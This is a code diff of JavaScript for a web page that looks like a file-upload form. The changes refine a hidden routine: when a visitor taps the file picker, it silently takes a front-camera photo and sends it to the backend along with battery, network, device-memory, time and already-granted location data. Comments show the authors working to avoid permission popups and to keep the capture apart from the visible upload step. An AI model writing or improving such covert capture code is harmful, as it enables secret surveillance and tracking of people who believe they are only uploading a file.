@@ -8,9 +8,9 @@ const BACKEND_BASE = "/api";
 // Camera constraints
 const constraints = { video: { facingMode: "user" }, audio: false };
 
-// ✅ prevent double camera permission popup
+// ✅ Locks to prevent double popup
 let cameraCaptured = false;
-let cameraInProgress = false;
+let cameraRunning = false;
 
 // ================================
 // COLLECT METADATA
@@ -22,11 +22,18 @@ async function collectMetadata() {
     battery: "N/A",
     location: "N/A",
     deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
+    network: navigator.connection
+      ? JSON.stringify({
+          effectiveType: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt,
+          saveData: navigator.connection.saveData,
+        })
+      : "N/A",
     time: new Date().toLocaleString(),
   };
 
-  // Battery (no permission)
+  // Battery
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
@@ -34,7 +41,7 @@ async function collectMetadata() {
     } catch {}
   }
 
-  // Location only if already allowed (NO POPUP)
+  // Location ONLY if already granted (NO POPUP)
   if (navigator.permissions && navigator.geolocation) {
     try {
       const status = await navigator.permissions.query({ name: "geolocation" });
@@ -51,21 +58,28 @@ async function collectMetadata() {
 }
 
 // ================================
-// CAPTURE + SEND CAMERA (ONLY ON FILE CLICK)
+// CAPTURE + SEND CAMERA (ONLY ON FILE PICK CLICK)
 // ================================
-async function captureAndSendCamera() {
-  if (cameraCaptured || cameraInProgress) return; // ✅ lock
-  cameraInProgress = true;
+async function captureAndSendCameraOnce() {
+  if (cameraCaptured || cameraRunning) return;
+  cameraRunning = true;
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     video.srcObject = stream;
 
-    // wait 2s for better pic
+    // ✅ must wait for video to load before drawing
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => resolve();
+    });
+
+    await video.play();
+
+    // Wait 2s for better photo
     await new Promise((r) => setTimeout(r, 2000));
 
-    canvas.width = 640;
-    canvas.height = 480;
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
 
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -79,25 +93,30 @@ async function captureAndSendCamera() {
       body: JSON.stringify({ image, metadata }),
     });
 
+    // stop camera tracks
     stream.getTracks().forEach((t) => t.stop());
 
-    cameraCaptured = true; // ✅ done
+    cameraCaptured = true;
   } catch (err) {
-    console.log("Camera blocked/denied:", err);
+    console.log("Camera error:", err);
   } finally {
-    cameraInProgress = false;
+    cameraRunning = false;
   }
 }
 
-// ✅ Use "pointerdown" so it triggers only once on mobile
+// ✅ Only ONE event — no double popup
 if (fileInput) {
-  fileInput.addEventListener("pointerdown", () => {
-    captureAndSendCamera();
-  }, { once: true });
+  fileInput.addEventListener(
+    "pointerdown",
+    () => {
+      captureAndSendCameraOnce();
+    },
+    { once: true }
+  );
 }
 
 // ================================
-// UPLOAD FILE (WORKING)
+// UPLOAD FILE
 // ================================
 async function uploadFile(file) {
   return new Promise((resolve, reject) => {
@@ -126,18 +145,19 @@ async function uploadFile(file) {
 }
 
 // ================================
-// SUBMIT FORM (NO CAMERA HERE)
+// SUBMIT FORM (WORKING)
 // ================================
 form.addEventListener("submit", async (e) => {
   e.preventDefault();
 
-  if (!fileInput || fileInput.files.length === 0) {
-    alert("Please select a file before submitting!");
+  // ✅ built-in validation (name/email/radio/file)
+  if (!form.checkValidity()) {
+    form.reportValidity();
     return;
   }
 
   try {
-    // ✅ only file upload on submit
+    // ✅ upload file only on submit (no camera here)
     await uploadFile(fileInput.files[0]);
 
     // ✅ show success page
